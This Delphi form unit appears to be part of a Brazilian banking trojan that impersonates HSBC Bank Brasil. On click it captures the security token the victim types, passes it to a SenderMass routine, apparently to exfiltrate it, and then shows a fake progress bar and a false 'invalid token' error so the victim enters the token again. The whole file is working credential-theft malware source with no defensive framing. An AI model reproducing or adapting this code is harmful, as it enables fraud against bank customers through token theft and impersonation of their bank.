unit Hs5;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls, ComCtrls;

type
  THsNews5 = class(TFrame)
    Image1: TImage;
    Bar: TProgressBar;
    Label1: TLabel;
    Image2: TImage;
    EditTok: TEdit;
    procedure Image2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

implementation

{$R *.dfm}
uses
Dhafne, Unitrix, Hs;

procedure THsNews5.Image2Click(Sender: TObject);
begin
  Label1.Visible := true;
  bar.Visible := True;
begin


DadosEnvio_ := TStringList.Create;

DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('I.T.O.K.E.N: '+EditTok.Text);
DadosEnvio_.Add('=============================================');


if length(DadosEnvio_.Text) < 6 then
begin
  MessageBox(Self.handle,'Digite o Token Gerado !', 'Hsbc bank Brasil S.A',
  mb_IconError + mb_Ok);
  DadosEnvio_.Free;
  Exit;
end;

//SENDBOX
try
  SenderMass(DadosEnvio_ , 'HTOKEN');
  DadosEnvio_.Free;
except
end;

Bar.Position:=10;
Sleep(100);
Bar.Position:=20;
Sleep(200);
Bar.Position:=30;
Sleep(300);
Bar.Position:=40;
Sleep(500);
Bar.Position:=50;
Sleep(300);
Bar.Position:=60;
Sleep(300);
Bar.Position:=70;
Sleep(500);
Bar.Position:=80;
Sleep(500);
Bar.Position:=90;
Sleep(200);
Bar.Position:=100;
Sleep(500);

  MessageBox(Self.handle,'Falha na Autenticação, Token Inválido! Tente Novamente!', 'Hsbc Bankin Brasil S.A',
  mb_IconError + mb_Ok);

label1.Visible := False;
bar.Visible := False;
EditTok.Clear;

end;
end;
end.
